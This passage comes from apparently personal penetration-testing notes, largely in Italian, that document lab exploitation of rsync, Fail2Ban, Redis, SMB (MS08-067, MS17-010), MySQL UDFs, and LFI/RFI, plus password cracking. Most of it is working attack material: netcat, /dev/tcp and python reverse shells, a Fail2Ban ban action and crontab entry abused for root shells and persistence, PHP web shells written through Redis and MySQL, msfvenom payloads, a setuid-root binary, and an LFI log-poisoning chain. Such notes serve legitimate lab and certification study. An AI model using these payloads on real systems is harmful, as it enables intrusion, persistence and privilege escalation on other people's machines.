Host is up (0.20s latency).

PORT    STATE SERVICE VERSION
873/tcp open  rsync   (protocol version 31)
| rsync-list-modules: 
|_  fox             fox home
```

Download contenuto folder:
```
(base) ┌──(kali㉿kali)-[~/Documents/ProvingGrounds/Fail]
└─$ rsync -av rsync://192.168.199.126:873/fox ./rsyn_shared
receiving incremental file list
created directory ./rsyn_shared
./
.bash_history -> /dev/null
.bash_logout
.bashrc
.profile

sent 87 bytes  received 4,828 bytes  1,966.00 bytes/sec
total size is 4,562  speedup is 0.93
```

Upload file:
```
(base) ┌──(kali㉿kali)-[~/Documents/ProvingGrounds/Fail]
└─$ rsync -av test.txt rsync://fox@192.168.199.126:873/fox 
sending incremental file list
test.txt

sent 102 bytes  received 35 bytes  54.80 bytes/sec
total size is 0  speedup is 0.00
```


### Fail2Ban
Vedi Fail di Providing Grounds.
https://www.digitalocean.com/community/tutorials/how-fail2ban-works-to-protect-services-on-a-linux-server

I file di configurazione in /etc/fail2ban:
```
fox@fail:/etc/fail2ban$ ls -la
total 72
drwxr-xr-x  6 root root      4096 Dec  3  2020 .
drwxr-xr-x 76 root root      4096 Jan 21 13:43 ..
drwxrwxr-x  2 root fail2ban  4096 Dec  3  2020 action.d
-rw-r--r--  1 root root      2334 Jan 18  2018 fail2ban.conf
drwxr-xr-x  2 root root      4096 Sep 23  2018 fail2ban.d
drwxr-xr-x  3 root root      4096 Dec  3  2020 filter.d
-rw-r--r--  1 root root     22910 Nov 19  2020 jail.conf
drwxr-xr-x  2 root root      4096 Dec  3  2020 jail.d
-rw-r--r--  1 root root       645 Jan 18  2018 paths-arch.conf
-rw-r--r--  1 root root      2827 Jan 18  2018 paths-common.conf
-rw-r--r--  1 root root       573 Jan 18  2018 paths-debian.conf
-rw-r--r--  1 root root       738 Jan 18  2018 paths-opensuse.conf
```

In jail.conf ci sono le definizioni dei file che deve considerare, per esempio:
```
[...]

# Default banning action (e.g. iptables, iptables-new,
# iptables-multiport, shorewall, etc) It is used to define
# action_* variables. Can be overridden globally or per
# section within jail.local file
banaction = iptables-multiport
banaction_allports = iptables-allports

[...]
```

In questo caso c'è come banaction il l'azione iptables-multiport che corrisponde al file iptables-multiport.conf nella cartella action.d.
Siccome, per esempio, vorrei eseguire codice utilizzando questo servizio e visto che posso modificare i file di conf delle azioni, e siccome ho visto che nel file jail.conf c'è "enabled = true" al servizio SSH, potrei modificare il file iptables-multiport.conf mettendo come azione quando banna (sezione **actionban**) un comando per creare la reverse shell. Così poi fallisco il login in ssh più volte e scateno l'azione di ban definita nel file:

```
fox@fail:/etc/fail2ban/action.d$ cat iptables-multiport.conf 
# Fail2Ban configuration file
#
# Author: Cyril Jaquier
# Modified by Yaroslav Halchenko for multiport banning
#

[INCLUDES]

before = iptables-common.conf

[Definition]

# Option:  actionstart
# Notes.:  command executed once at the start of Fail2Ban.
# Values:  CMD
#
actionstart = <iptables> -N f2b-<name>
              <iptables> -A f2b-<name> -j <returntype>
              <iptables> -I <chain> -p <protocol> -m multiport --dports <port> -j f2b-<name>

# Option:  actionstop
# Notes.:  command executed once at the end of Fail2Ban
# Values:  CMD
#
actionstop = <iptables> -D <chain> -p <protocol> -m multiport --dports <port> -j f2b-<name>
             <actionflush>
             <iptables> -X f2b-<name>

# Option:  actioncheck
# Notes.:  command executed once before each actionban command
# Values:  CMD
#
actioncheck = <iptables> -n -L <chain> | grep -q 'f2b-<name>[ \t]'

# Option:  actionban
# Notes.:  command executed when banning an IP. Take care that the
#          command is executed with Fail2Ban user rights.
# Tags:    See jail.conf(5) man page
# Values:  CMD
#
actionban = nc 192.168.49.114 80 -e /bin/bash
#<iptables> -I f2b-<name> 1 -s <ip> -j <blocktype>

# Option:  actionunban
# Notes.:  command executed when unbanning an IP. Take care that the
#          command is executed with Fail2Ban user rights.
# Tags:    See jail.conf(5) man page
# Values:  CMD
#
actionunban = <iptables> -D f2b-<name> -s <ip> -j <blocktype>
```

Ovviamente questo è possibile se si può riavviare il servizio fail2ban così da ricaricare i file di conf. In questo esempio, veniva restartato ogni minuto il servizio.

##### Persistenza

Però se il riavvio è automatico (per esempio ogni minuto) si potrebbe perdere la reverse shell, per la PERSISTENZA quindi si può mettere come azione di ban:
```
echo "*  *  *  *  * root nc 192.168.118.5 4444 -e /usr/bin/bash" >> /etc/crontab
```

Così si crea un cron job che crea la reverse shell e non si perde più la reverse shell.


### Redis
$ redis-cli -h 10.10.239.36 -p 6379

Per fare una reverse shell:
https://book.hacktricks.xyz/pentesting/6379-pentesting-redis


10.10.239.36:6379> config set dir /var/www/html
OK
10.10.239.36:6379> config set dbfilename shell.php
OK
10.10.239.36:6379> set test "<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/'10.8.80.159'/4444 0>&1'\");?>"
OK
10.10.239.36:6379> save
OK


In questo caso, essendoci un server apache sulla 80 ho potuto accederci tramite:
https://10.10.239.36/shell.php


##### Redis 4.x/5.x RCE
Con MSF: linux/redis/redis_replication_cmd_exec

Con exploit GITHUB: https://github.com/vulhub/redis-rogue-getshell

Già scaricato in **~/Programs** ed eseguire:

```
sudo python3 redis-master.py -r 192.168.199.69 -p 6379 -L 192.168.49.199 -P 6379 -f RedisModulesSDK/exp.so -c "/usr/bin/python2.7 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.49.199\",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'"
```


### Netdiscover:
netdiscover -i eth0



### Samba / smbclient:

Per vedere i workgroup:
└─$ nmblookup -A 192.168.1.104
Looking up status of 192.168.1.104
	KIOPTRIX        <00> -         B <ACTIVE> 
	KIOPTRIX        <03> -         B <ACTIVE> 
	KIOPTRIX        <20> -         B <ACTIVE> 
	..__MSBROWSE__. <01> - <GROUP> B <ACTIVE> 
	MYGROUP         <00> - <GROUP> B <ACTIVE> 
	MYGROUP         <1d> -         B <ACTIVE> 
	MYGROUP         <1e> - <GROUP> B <ACTIVE> 

	MAC Address = 00-00-00-00-00-00




Se dovesse uscire l'errore:

protocol negotiation failed: NT_STATUS_IO_TIMEOUT


Bisogna settargli la versione minima del protocollo aggiungendo:
--option='client min protocol = NT1'
oppure 
modificare il file **/etc/samba/smb.conf** aggiungendo nella sezione "[global]" "client min protocol = NT1" e riavviare samba con il comando ```sudo service smbd restart```


Per vedere invece la versione, si può sniffare il traffico e poi eseguire smbclient e il pacchetto con Info "Session Setup AndX Response" ci dà la versione, per esempio "Samba 2.2.1a"
Ci sarebbe anche lo script smb-ver.sh ma non è molto affidabile (pare)


Enumerazione NetBIOS usando nmap:

```
$ nmap -sC --script=smb-enum-users $IP

Starting Nmap 7.40 ( https://nmap.org ) at 2016-12-29 02:37 CST
Nmap scan report for 192.168.1.14
Host is up (0.00096s latency).
Not shown: 566 closed ports, 430 filtered ports
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
MAC Address: 00:0C:29:8B:97:53 (VMware)

Host script results:
| smb-enum-users: 
|   KIOPTRIX4\john (RID: 3002)
|     Full name:   ,,,
|     Flags:       Normal user account
|   KIOPTRIX4\loneferret (RID: 3000)
|     Full name:   loneferret,,,
|     Flags:       Normal user account
|   KIOPTRIX4\nobody (RID: 501)
|     Full name:   nobody
|     Flags:       Normal user account
|   KIOPTRIX4\robert (RID: 3004)
|     Full name:   ,,,
|     Flags:       Normal user account
|   KIOPTRIX4\root (RID: 1000)
|     Full name:   root
|_    Flags:       Normal user account


Nmap done: 1 IP address (1 host up) scanned in 2.85 seconds
```


### Escaping Restricted Linux Shells
https://www.sans.org/blog/escaping-restricted-linux-shells/
https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf

```
john:~$ echo os.system('/bin/bash')
```

### SMB 
File noti:
```
smbpasswd.bak, passwd zip and smb conf zip
```

```
└─$ nmap -v -p 139,445 --script=smb-vuln-ms* --script-args=unsafe=1 10.11.1.5     
    PORT    STATE SERVICE
    139/tcp open  netbios-ssn
    445/tcp open  microsoft-ds
    
    Host script results:
    | smb-vuln-ms08-067: 
    |   VULNERABLE:
    |   Microsoft Windows system vulnerable to remote code execution (MS08-067)
    |     State: VULNERABLE
    |     IDs:  CVE:CVE-2008-4250
    |           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,
    |           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary
    |           code via a crafted RPC request that triggers the overflow during path canonicalization.
    |           
    |     Disclosure date: 2008-10-23
    |     References:
    |       https://technet.microsoft.com/en-us/library/security/ms08-067.aspx
    |_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250
    |_smb-vuln-ms10-054: ERROR: Script execution failed (use -d to debug)
    |_smb-vuln-ms10-061: NT_STATUS_OBJECT_NAME_NOT_FOUND
    | smb-vuln-ms17-010: 
    |   VULNERABLE:
    |   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
    |     State: VULNERABLE
    |     IDs:  CVE:CVE-2017-0143
    |     Risk factor: HIGH
    |       A critical remote code execution vulnerability exists in Microsoft SMBv1
    |        servers (ms17-010).
    |           
    |     Disclosure date: 2017-03-14
    |     References:
    |       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
    |       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
    |_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
    
    NSE: Script Post-scanning.
    Initiating NSE at 11:49
    Completed NSE at 11:49, 0.00s elapsed
    Read data files from: /usr/bin/../share/nmap
    Nmap done: 1 IP address (1 host up) scanned in 20.92 seconds
```

#### ms08-067
Puoi vedere anche: https://0xdf.gitlab.io/2019/02/21/htb-legacy.html

https://github.com/andyacer/ms08_067

We substitute the payload:
```
     ------------------------------------------------------------------------
    # REPLACE THIS SHELLCODE with shellcode generated for your use
    # Note that length checking logic follows this section, so there's no need to count bytes or bother with NOPS.
    #
    # Example msfvenom commands to generate shellcode:
    # msfvenom -p windows/shell_bind_tcp RHOST=10.11.1.229 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows
    # msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.157 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows
    # msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.157 LPORT=62000 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows
    
    # Reverse TCP to 10.11.0.157 port 62000:
    shellcode= ( 
  SOSTIURI QUI!!!
    )
```

We use msfvenom to generate the payload:
```
    └─$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.168 LPORT=4444 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows
```
We set a listener on the port 4444 and we run the script:
```
    python3 ms08_067_2018.py 10.11.1.5 1 443 
```
We use the argument “1” because the OS is Windows XP SP0/SP1 Universal and in the script there was indicate the code for the different OS:
```
    print ('\nUsage: %s <target ip> <os #> <Port #>\n' % sys.argv[0])
    print ('Example: MS08_067_2018.py 192.168.1.1 1 445 -- for Windows XP SP0/SP1 Universal, port 445')
    print ('Example: MS08_067_2018.py 192.168.1.1 2 139 -- for Windows 2000 Universal, port 139 (445 could also be used)')
    print ('Example: MS08_067_2018.py 192.168.1.1 3 445 -- for Windows 2003 SP0 Universal')
    print ('Example: MS08_067_2018.py 192.168.1.1 4 445 -- for Windows 2003 SP1 English')
    print ('Example: MS08_067_2018.py 192.168.1.1 5 445 -- for Windows XP SP3 French (NX)')
    print ('Example: MS08_067_2018.py 192.168.1.1 6 445 -- for Windows XP SP3 English (NX)')
    print ('Example: MS08_067_2018.py 192.168.1.1 7 445 -- for Windows XP SP3 English (AlwaysOn NX)')
```
```
└─$ sudo nc -lnvp 4444
```

#### MS09_050
cve 2009-3103
https://www.exploit-db.com/exploits/40280
Vedi Internal di Providing Grounds.

### MS17-010 
Prima Possibilità:
https://0xdf.gitlab.io/2019/02/21/htb-legacy.html

Si prende lo script send_and_execute.py dal link https://github.com/helviojunior/MS17-010 
N.B. Se si usa l'utente guest in SMB (quindi premendo invio quando si esegue il comando smblient), nello script potrebbe servire inserire '\\' come username:
```
USERNAME = '\\'
PASSWORD = ''
```

e poi si genera il payload:
```
root@kali# msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.14 LPORT=443 EXITFUNC=thread -f exe -a x86 --platform windows -o rev_10.10.14.14_443.exe
No encoder or badchars specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
Saved as: rev_10.10.14.14_443.exe
```

E poi si esegue, mettendo prima in ascolto un listener:
```
root@kali# python send_and_execute.py 10.10.10.4 rev_10.10.14.14_443.exe
Trying to connect to 10.10.10.4:445
Target OS: Windows 5.1
Using named pipe: browser
Groom packets
attempt controlling next transaction on x86
success controlling one transaction
modify parameter count to 0xffffffff to be able to write backward
leak next transaction
CONNECTION: 0x82246bb8
SESSION: 0xe10f9408
FLINK: 0x7bd48
InData: 0x7ae28
MID: 0xa
TRANS1: 0x78b50
TRANS2: 0x7ac90
modify transaction struct for arbitrary read/write
make this SMB session to be SYSTEM
current TOKEN addr: 0xe1b1df10
userAndGroupCount: 0x3
userAndGroupsAddr: 0xe1b1dfb0
overwriting token UserAndGroups
Sending file N0KFUJ.exe...
Opening SVCManager on 10.10.10.4.....
Creating service TMkY.....
Starting service TMkY.....
The NETBIOS connection with the remote host timed out.
Removing service TMkY.....
ServiceExec Error on: 10.10.10.4
nca_s_proto_error
Done
```
E si ha la shell:
```
root@kali# nc -lnvp 443
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.4.
Ncat: Connection from 10.10.10.4:1029.
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\WINDOWS\system32>
```





Seconda Possibilità (viene usato anche Metasploit):
windows/remote/42315.py

```
    (base) ┌──(kali㉿kali)-[~/Documents/OSCP/Bruce]
    └─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.119.168 LPORT=4444  -f exe > shell.exe
```

E quando l'ho usato, ho modificato questa funzione per eseguire l'upload del file:
We use the script 42315.py only for upload the file because seems that doesn't run other command. Also we modify the code:
```
    def smb_pwn(conn, arch):
    	smbConn = conn.get_smbconnection()
    	
    	print('creating file c:\\pwned.txt on the target')
    	#tid2 = smbConn.connectTree('C$')
    	#fid2 = smbConn.createFile(tid2, '/shell.exe')
    	#smbConn.closeFile(tid2, fid2)
    	#smbConn.disconnectTree(tid2)
    	
    	smb_send_file(smbConn, '/home/kali/Documents/OSCP/Bruce/shell.exe', 'C', '/shell.exe')
    
    
    	# Note: there are many methods to get shell over SMB admin session
    	# a simple method to get shell (but easily to be detected by AV) is
    	# executing binary generated by "msfvenom -f exe-service ..."
```
with **smb_send_file** we can upload the file.

E poi eseguo:
```
python 42315.py 10.11.1.75
```

Per eseguirlo invece ho usato metasploit:

To execute the script, we use the metasploit module **admin/smb/ms17_010_command**, but first we first disable the firewall:
```
    msf6 auxiliary(admin/smb/ms17_010_command) > set COMMAND "NetSh Advfirewall set allprofiles state off"
    COMMAND => NetSh Advfirewall set allprofiles state off
    msf6 auxiliary(admin/smb/ms17_010_command) > run
    
    [*] 10.11.1.75:445        - Target OS: Windows 8.1 Enterprise 9600
    [*] 10.11.1.75:445        - Built a write-what-where primitive...
    [+] 10.11.1.75:445        - Overwrite complete... SYSTEM session obtained!
    [+] 10.11.1.75:445        - Service start timed out, OK if running a command or non-service executable...
    [*] 10.11.1.75:445        - Getting the command output...
    [*] 10.11.1.75:445        - Executing cleanup...
    [+] 10.11.1.75:445        - Cleanup was successful
    [+] 10.11.1.75:445        - Command completed successfully!
    [*] 10.11.1.75:445        - Output for "NetSh Advfirewall set allprofiles state off":
    
    Ok.
    
    
    
    [*] 10.11.1.75:445        - Scanned 1 of 1 hosts (100% complete)
    [*] Auxiliary module execution completed
```

And then we run the payload (we first set a listener):
```
    [*] Auxiliary module execution completed
    msf6 auxiliary(admin/smb/ms17_010_command) > set COMMAND "C:\\shell.exe"
    COMMAND => C:\shell.exe
    msf6 auxiliary(admin/smb/ms17_010_command) > run
    
    [*] 10.11.1.75:445        - Target OS: Windows 8.1 Enterprise 9600
    [*] 10.11.1.75:445        - Built a write-what-where primitive...
    [+] 10.11.1.75:445        - Overwrite complete... SYSTEM session obtained!
    [+] 10.11.1.75:445        - Service start timed out, OK if running a command or non-service executable...
    [-] 10.11.1.75:445        - Unable to get handle: The server responded with error: STATUS_SHARING_VIOLATION (Command=45 WordCount=0)
    [-] 10.11.1.75:445        - Command seems to still be executing. Try increasing RETRY and DELAY
    [*] 10.11.1.75:445        - Getting the command output...
    [*] 10.11.1.75:445        - Command finished with no output
    [*] 10.11.1.75:445        - Executing cleanup...
    [+] 10.11.1.75:445        - Cleanup was successful
    [+] 10.11.1.75:445        - Command completed successfully!
    [*] 10.11.1.75:445        - Output for "C:\shell.exe":
```

Però volendo si può usare lo script python e usare la funzione **service_exec** per eseguire lo script che si carica, così si evita Metasploit.
Spiegazione:
https://null-byte.wonderhowto.com/how-to/manually-exploit-eternalblue-windows-server-using-ms17-010-python-exploit-0195414/

### MySQL
Non provato:
```
sudo mysql -uroot -pLetMeIn123 -e '\! /bin/sh'
```
----

Vedi anche Banzai di Providing Grounds.

Se trovi un mysql con accesso di root, puoi sfruttare la vuln nota MySQL UDF
In questo link https://www.exploit-db.com/exploits/46249 MySQL User-Defined (Linux) x32 / x86_64 sys_exec function local privilege escalation exploit

Prima devi vedere se MySQL sta eseguendo con privilegi di root:

$ ls -la /usr/lib/lib_mysqludf_sys.so 
-rw-rw-rw- 1 root root 12896 2012-02-04 10:08 /usr/lib/lib_mysqludf_sys.so


Poi puoi sfruttare la vuln: (In questo caso si danno i privilegi di admin all'utente john) https://lifesfun101.github.io/2019/09/05/kioptrix-1.3-walkthrough.html
```
john@Kioptrix4:/var/www$ mysql -h localhost -u root -p
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 105
Server version: 5.0.51a-3ubuntu5.4 (Ubuntu)

Type 'help;' or '\h' for help. Type '\c' to clear the buffer.

mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema | 
| members            | 
| mysql              | 
+--------------------+
3 rows in set (0.00 sec)

mysql> select sys_exec('usermod -a -G admin john');
+--------------------------------------+
| sys_exec('usermod -a -G admin john') |
+--------------------------------------+
| NULL                                 | 
+--------------------------------------+
1 row in set (0.08 sec)
```


Con questa vuln, si potrebbe anche pensare di fare uno compilato per settare i suid di root:
```
john@Kioptrix4:~$ cd /tmp
john@Kioptrix4:/tmp$ cat setuid.c
int main()
{
     setgid(0);
     setuid(0);
     system("/bin/bash");
}
john@Kioptrix4:/tmp$ gcc -o setuid setuid.c
The program 'gcc' can be found in the following packages:
* gcc
* pentium-builder
Ask your administrator to install one of them
bash: gcc: command not found

root@kali:~# cat setuid.c
int main()
{
     setgid(0);
     setuid(0);
     system("/bin/bash");
}
root@kali:~# gcc -o setuid setuid.c -m32
root@kali:~# python -m SimpleHTTPServer
Serving HTTP on 0.0.0.0 port 8000 ...
172.16.119.135 - - [15/May/2015 08:28:52] "GET /setuid HTTP/1.0" 200 -

john@Kioptrix4:/tmp$ rm setuid.c
john@Kioptrix4:/tmp$ wget http://172.16.119.128:8000/setuid
--10:28:54--  http://172.16.119.128:8000/setuid
           => `setuid'
Connecting to 172.16.119.128:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 5,072 (5.0K) [application/octet-stream]

100%[====================================>] 5,072         --.--K/s            

10:28:54 (711.75 MB/s) - `setuid' saved [5072/5072]

john@Kioptrix4:/tmp$ ls -al
total 20
drwxrwxrwt  3 root root 4096 2015-05-15 10:28 .
drwxr-xr-x 21 root root 4096 2012-02-06 18:41 ..
-rw-r--r--  1 john john 5072 2015-05-15 08:28 setuid
drwxr-xr-x  2 root root 4096 2015-05-15 08:35 .winbindd

john@Kioptrix4:/tmp$ mysql -u root
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 38
Server version: 5.0.51a-3ubuntu5.4 (Ubuntu)

Type 'help;' or '\h' for help. Type '\c' to clear the buffer.

mysql> select sys_exec('chown root:root /tmp/setuid; chmod 4755 /tmp/setuid');
+-----------------------------------------------------------------+
| sys_exec('chown root:root /tmp/setuid; chmod 4755 /tmp/setuid') |
+-----------------------------------------------------------------+
| NULL                                                            |
+-----------------------------------------------------------------+
1 row in set (0.00 sec)

mysql> exit
Bye
john@Kioptrix4:/tmp$ ./setuid
root@Kioptrix4:/tmp# id
uid=0(root) gid=0(root) groups=1001(john)
```

Questo se la funzione **sys_exec** è già definita perchè c'è il binario lib_mysqludf_sys.so. Se non è definita e non c'è quel binario, si può fare così:
```
mysql> use mysql;
use mysql;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> create table npn(line blob);
create table npn(line blob);
Query OK, 0 rows affected (0.02 sec)

mysql> insert into npn values(load_file('/var/www/html/lib_mysqludf_sys_64.so'));
insert into npn values(load_file('/var/www/html/lib_mysqludf_sys_64.so'));
Query OK, 1 row affected (0.01 sec)

mysql> select * from npn into dumpfile '/usr/lib/mysql/plugin/lib_mysqludf_sys_64.so'
select * from npn into dumpfile '/usr/lib/mysql/plugin/lib_mysqludf_sys_64.so';
Query OK, 1 row affected (0.00 sec)

mysql> create function sys_exec returns integer soname 'lib_mysqludf_sys_64.so';
create function sys_exec returns integer soname 'lib_mysqludf_sys_64.so';
Query OK, 0 rows affected (0.01 sec)

mysql> select sys_exec('nc 192.168.49.193 22 -e /bin/bash');
select sys_exec('nc 192.168.49.193 22 -e /bin/bash');

```

I binari (sia Linux che Windows) li trovi in https://github.com/rapid7/metasploit-framework/tree/master/data/exploits/mysql


**Altro modo usando raptor_udf2.c**
Vedi anche Banzai di Providing Grounds in cui controlla le variabili **plugin_dir** e **secure_file_priv** per capire se si può utilizzare la misconfiguration.
(Writeup lab: Fw_dev)
- MySQL 4.x/5.0 (Linux) - User-Defined Function (UDF) Dynamic Library (2)
https://www.exploit-db.com/exploits/1518

Praticamente si possono eseguire comandi come root, quindi si può creare un secondo utente root e accedere con quello.
```
* Usage:
* $ id
* uid=500(raptor) gid=500(raptor) groups=500(raptor)
* $ gcc -g -c raptor_udf2.c
* $ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
* $ mysql -u root -p
* Enter password:
* [...]
* mysql> use mysql;
* mysql> create table foo(line blob);
* mysql> insert into foo values(load_file('/home/raptor/raptor_udf2.so'));
* mysql> select * from foo into dumpfile '/usr/lib/raptor_udf2.so';
* mysql> create function do_system returns integer soname 'raptor_udf2.so';
* mysql> select * from mysql.func;
* +-----------+-----+----------------+----------+
* | name      | ret | dl             | type     |
* +-----------+-----+----------------+----------+
* | do_system |   2 | raptor_udf2.so | function |
* +-----------+-----+----------------+----------+
* mysql> select do_system('id > /tmp/out; chown raptor.raptor /tmp/out');
* mysql> \! sh
* sh-2.05b$ cat /tmp/out
* uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm)
```


**you can inject php shell here**
```
$ mysql> Select "<?php echo shell_exec($_GET['cmd']);?>" into outfile "/var/www/https/blogblog/wp-content/uploads/shell.php";
```

Trovato da un writeup (esegue reverse shell, utilizzando mknod inserendolo nel parametro cmd del file .php che ha caricato prima)
Browsing to the file, as with part 4, I did not get any feedback from running commands such as /phpmyadmin_shell.php?cmd=whoami however I was able to obtain a reverse shell connection using mknod:
```
mknod /tmp/backpipe p; nc 192.168.110.129 8444 0/tmp/backpipe
```


### LFI
https://blog.g0tmi1k.com/2012/02/kioptrix-level-4-local-file/

https://www.doyler.net/security-not-included/kioptrix-level-1-3-4-walkthrough

```
// Burp -> target -> site map -> http://192.168.0.4 -> checklogin.php -> Right click: myusername=user&mypassword=password -> Send to repeater
// Burp -> repeater -> 2 -> go                                          # Content-Length: 109. HTTP/1.1:200. (AKA Response doesn't have no phpsessid)
// Burp -> repeater -> 2 -> params -> mypassword: ' or 1=1-- - ->  go   # Content-Length: 429. HTTP/1.1:302. (AKA Response: cookie has a phpsessid value)
// Burp -> repeater -> 2 -> params -> new -> cookie -> PHPSESSID:cec3a2499fb7067f170ccfaca1fb7980
// Burp -> repeater -> 2 -> follow redirect -> follow redirect -> params -> url -> username: index.php -> go
// Burp -> repeater -> 2 -> params -> url -> username: index.php%00 -> go
// Burp -> repeater -> 2 -> params -> url -> username: /etc/passwd%00 -> go
// Burp -> repeater -> 2 -> params -> url -> username: /etc/etc/passwd%00 -> go
// Burp -> repeater -> 2 -> params -> url -> username: /proc/self/cmdline%00 -> go
// Burp -> (toolbar) repeater -> action -> sent to: intruder
// Burp -> intruder -> position -> clear § -> GET /member.php?username=/proc/self/fd/§id%00§ HTTP/1.1
// Burp -> intruder -> payload -> numbers -> from: 0 -> to: 10 -> Step: 1
// Burp -> (toolbar) intruder -> start attack
// Burp -> response  # 9
// Burp -> repeater -> 2 -> < -> < -> < -> < -> < -> < -> < -> remove: PHPSESSID -> mypassword: ' or 1=1-- - <?php phpinfo(); ?> -> go
// Burp -> repeater -> 2 -> params -> new -> cookie -> PHPSESSID:9d64e60834f145250acc4ad08ca3eabc -> go -> follow redirct -> follow redirct
// Firefox -> http://192.168.0.4/member.php?username=/proc/self/fd/9%00
// Burp -> repeater -> 2 -> < -> < -> < -> remove: PHPSESSID -> mypassword: ' or 1=1-- <?php echo "\n\n"; passthru($_GET['cmd']); ?> -> go
// Burp -> repeater -> 2 -> params -> new -> cookie -> PHPSESSID:a513efb8691a7f125a6c80af573eae25 -> go -> follow redirct -> follow redirct
curl --cookie "PHPSESSID=a513efb8691a7f125a6c80af573eae25" "http://192.168.0.4/member.php?username=/proc/self/fd/9%00&cmd=id"
curl --cookie "PHPSESSID=a513efb8691a7f125a6c80af573eae25" "http://192.168.0.4/member.php?username=/proc/self/fd/9%00&cmd=whereis%20netcat"

nc -lvvp 443

curl --cookie "PHPSESSID=a513efb8691a7f125a6c80af573eae25" "http://192.168.0.4/member.php?username=/proc/self/fd/9%00&cmd=/bin/nc.traditional%20192.168.0.192%20443%20-e%20/bin/sh"
```

Spettacolo, praticamente usa il parametro username per leggere il contenuto di /etc/proc/fd/9 in cui viene loggato quello che inserisce l'utente al login. Quindi utilizza i log per fare una reverse shell


#### Test da fare per LFI
notes parameter 															Error Message
ninevehNotes.txt 				 				 				 			No error, displays note
/etc/passwd 				 				 				 				No Note is selected.
../../../../../../../../../../etc/passwd 							No Note is selected.
ninevehNotes 				 				 				 				Warning: include(files/ninevehNotes): failed to open stream: No such file or directory in /var/www/html/department/manage.php on line 31
ninevehNote 				 				 				 				No Note is selected.
files/ninevehNotes/../../../../../../../../../etc/passwd 	File name too long.
files/ninevehNotes/../../../../../../../etc/passwd  			The contents of /etc/passwd
/ninevehNotes/../etc/passwd 				 				 			The contents of /etc/passwd

Esempio da https://0xdf.gitlab.io/2020/04/22/htb-nineveh.html#shell-as-www-data-via-phpinfophp


### RFI
Vedi Slort di Providing Grounds:

```
┌──(kali㉿kali)-[~]
└─$ curl http://192.168.68.53:8080/site/index.php?page=hola                            
<br />
<b>Warning</b>:  include(hola): failed to open stream: No such file or directory in <b>C:\xampp\htdocs\site\index.php</b> on line <b>4</b><br />
<br />
<b>Warning</b>:  include(): Failed opening 'hola' for inclusion (include_path='C:\xampp\php\PEAR') in <b>C:\xampp\htdocs\site\index.php</b> on line <b>4</b><br />

Let’s determine if the vulnerability allows remote file inclusion. We’ll direct the vulnerable parameter to our attack machine which is running a netcat listener on port 80.

┌──(kali㉿kali)-[~]
└─$ curl http://192.168.68.53:8080/site/index.php?page=http://192.168.49.68/hola        

We receive a connection on our listener, which confirms the remote file inclusion vulnerability.

┌──(kali㉿kali)-[~]
└─$ sudo nc -lvvp 80                                                                                 
listening on [any] 80 ...
192.168.68.53: inverse host lookup failed: Host name lookup failure
connect to [192.168.49.68] from (UNKNOWN) [192.168.68.53] 49709
GET /hola HTTP/1.0
Host: 192.168.49.68
Connection: close

To confirm that we can execute remote code, we’ll create an info.php file on our attack machine, and serve it from a Python web server on port 80.

┌──(kali㉿kali)-[~]
└─$ cat info.php                                                                                      
<?php
phpinfo();
?>

┌──(kali㉿kali)-[~]
└─$ sudo python3 -m http.server 80                                                        
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

Navigating to our hosted info.php file confirms that our code is being executed on the target.
```


### JohnTheRipper
To crack a RAR:
```
rar2john MSSQL_BAK.rar > hash
```

To crack a PDF:
```
/usr/share/john/pdf2john.pl Infrastructure.pdf > hash
```
(se non sembra andare, vedi se magari scaricando il file si è corrotto,magari in ftp non hai usato bin prima di scaricarlo
altrimenti puoi usare ```perl ~/Programs/john-bleeding-jumbo/run/pdf2john.pl Infrastructure.pdf > hash```)

```
john --wordlist=~/Documents/rockyou.txt hash
```

### Hashcat
To crack keepass file:
```
root@kali:~/htb/tally# keepass2john tim.kdbx > tim.keepasshash
root@kali:~/htb/tally# cat tim.keepasshash 
